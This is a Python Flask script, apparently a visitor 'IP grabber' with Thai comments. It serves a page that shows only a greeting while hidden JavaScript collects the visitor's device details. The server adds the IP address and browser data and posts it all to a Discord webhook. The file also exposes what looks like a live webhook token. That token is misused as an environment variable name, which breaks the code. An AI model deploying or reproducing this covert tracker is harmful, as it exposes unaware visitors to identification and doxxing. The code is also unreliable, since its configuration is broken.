from flask import Flask, request
from user_agents import parse
from datetime import datetime
import requests
import os

app = Flask(__name__)

# ใส่ Discord Webhook ผ่าน Environment Variable
WEBHOOK_URL = os.environ.get("https://discord.com/api/webhooks/1453051676423618590/-mvVCRBnzPKALk_3WqPx8AKL8vssSXBvOUIicvCfJieCl7EHmgQ_4qqIiJbKcxu1HyaW", "ใส่ webhook ของคุณตรงนี้ถ้าอยากทดสอบ")

@app.route("/")
def home():
    # ส่ง HTML + JS แบบ inline เลย ไม่ต้องสร้าง index.html
    return """
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Visitor Logger</title>
</head>
<body>
  <h1>Hello 👋</h1>

  <script>
    fetch("/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        screen: `${screen.width}x${screen.height}`,
        platform: navigator.platform,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        touch: navigator.maxTouchPoints > 0 ? "Yes" : "No"
      })
    });
  </script>
</body>
</html>
"""

@app.route("/log", methods=["POST"])
def log_visitor():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0]
    ua_string = request.headers.get("User-Agent", "")
    ua = parse(ua_string)
    data = request.json or {}

    message = f"""
🌐 **New Visitor**
Time: `{datetime.now().isoformat()}`
IP: `{ip}`
Device: `{ua.device.family}`
Device Type: `{"Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "PC"}`
OS: `{ua.os.family} {ua.os.version_string}`
Browser: `{ua.browser.family} {ua.browser.version_string}`
Language: `{request.headers.get("Accept-Language")}`
Screen: `{data.get("screen")}`
Platform: `{data.get("platform")}`
Timezone: `{data.get("timezone")}`
Touch Support: `{data.get("touch")}`
"""

    try:
        requests.post(WEBHOOK_URL, json={"content": message})
    except Exception as e:
        print("Error sending to Discord:", e)

    return {"status": "ok"}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
